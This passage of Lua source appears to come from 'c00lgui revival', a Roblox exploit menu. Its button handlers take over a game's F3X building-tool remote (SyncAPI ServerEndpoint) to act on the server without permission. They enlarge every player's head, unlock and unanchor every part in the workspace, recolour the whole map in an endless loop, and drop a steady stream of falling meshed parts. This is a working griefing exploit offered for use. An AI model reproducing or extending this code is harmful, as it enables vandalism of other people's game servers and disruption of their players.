			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
	
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = workspace.Part
					},
					[3] = stringg
				}
	
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
	
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
	
			function Material(part,mate)
	
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Material"] = mate
						}
					}
				}
				_(args)
			end
			function Color(part,color)
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Color"] = color --[[Color3]],
							["UnionColoring"] = false
						}
					}
				}
				_(args)
			end
			hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
			hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
			hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
			function SpawnBasePlate()
				CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
				for i,v in game.Workspace:GetChildren() do
					if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
						spawn(function()
							Resize(v,Vector3.new(1000,2,1000),CFrame.new(hrpx,hrpy-20,hrpz))
							Material(v,Enum.Material.Grass)
							Color(v,Color3.fromRGB(25,100,25))
							while wait(1) do
								pcall(function()SetLocked(v,true)end)
							end
						end)
					end
				end
			end
			SpawnBasePlate()
	end)
end
coroutine.wrap(LQAKNWI_fake_script)()
local function MPCIN_fake_script() -- button_54.LocalScript 
	local script = Instance.new('LocalScript', button_54)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function BigHead(player)
			local chara = player.Character
			spawn(function()
				SetLocked(chara.Head,false)
				MeshResize(chara.Head,Vector3.new(10,10,10))
			end)
		end
		for i,players in game.Players:GetPlayers() do
			BigHead(players)
		end
	end)
end
coroutine.wrap(MPCIN_fake_script)()
local function HQBSF_fake_script() -- button_55.LocalScript 
	local script = Instance.new('LocalScript', button_55)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function Unanchor()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					SetAnchor(false,v)
				end)
			end
		end
		Unanchor()
	
	end)
end
coroutine.wrap(HQBSF_fake_script)()
local function THNGQF_fake_script() -- button_56.LocalScript 
	local script = Instance.new('LocalScript', button_56)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						Color(v,Color3.new(math.random(0,255),math.random(0,255),math.random(0,255)))
					end)
				end
			end
		end
		while wait() do
			spawn(function()
				randomise()
			end)
		end
	end)
end
coroutine.wrap(THNGQF_fake_script)()
local function VTUOG_fake_script() -- button_57.LocalScript 
	local script = Instance.new('LocalScript', button_57)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = workspace
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = workspace.Part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		hrpcf = player.Character.HumanoidRootPart.CFrame
		while wait(0.5) do
			x = hrpcf.x
			z = hrpcf.z
			randint = math.random(-600,600)
			randint2 = math.random(-600,600)
			xloc = randint + x
			zloc = randint2 + z
			cf = player.Character.HumanoidRootPart.CFrame.y + 400
			spawn(function()
				CreatePart(CFrame.new(math.floor(xloc), math.random(cf,cf+400), math.floor(zloc)))
				for i,v in game.Workspace:GetDescendants() do
					if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
						SetName(v,"b_1337")
						SetAnchor(false,v)
						AddMesh(v)
						Resize(v, Vector3.new(100,100,100),v.CFrame)
						MeshResize(v,Vector3.new(20,20,20))
						SetMesh(v,"1618237875")
						SetTexture(v, "1618237897")
						SetCollision(v,false)
					else
					end
				end
			end)
		end
	end)
end
coroutine.wrap(VTUOG_fake_script)()
local function MDDNVMA_fake_script() -- button_58.LocalScript 
	local script = Instance.new('LocalScript', button_58)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text = "15475953475"
	end)
end
coroutine.wrap(MDDNVMA_fake_script)()
local function XFYH_fake_script() -- button_59.LocalScript 
	local script = Instance.new('LocalScript', button_59)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text = "3342499434"
	end)
end
coroutine.wrap(XFYH_fake_script)()
local function CDBIWK_fake_script() -- button_60.LocalScript 
	local script = Instance.new('LocalScript', button_60)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text = "358313209"
	end)
end
coroutine.wrap(CDBIWK_fake_script)()
local function JFZIKQ_fake_script() -- button_61.LocalScript 
	local script = Instance.new('LocalScript', button_61)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text = "16432013221"
	end)
end
coroutine.wrap(JFZIKQ_fake_script)()
local function FBHUDW_fake_script() -- button_62.LocalScript 
	local script = Instance.new('LocalScript', button_62)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text = "13283475854"
	end)
end
coroutine.wrap(FBHUDW_fake_script)()
local function ELDZR_fake_script() -- button_63.LocalScript 
	local script = Instance.new('LocalScript', button_63)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text = "16673285043"
	end)
end
coroutine.wrap(ELDZR_fake_script)()

if game.PlaceId == "192800" then
CoolGui.Parent = game.CoreGui
end

game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "c00lgui", -- Required
	Text = "c00lgui revival has loaded.", -- Required
})
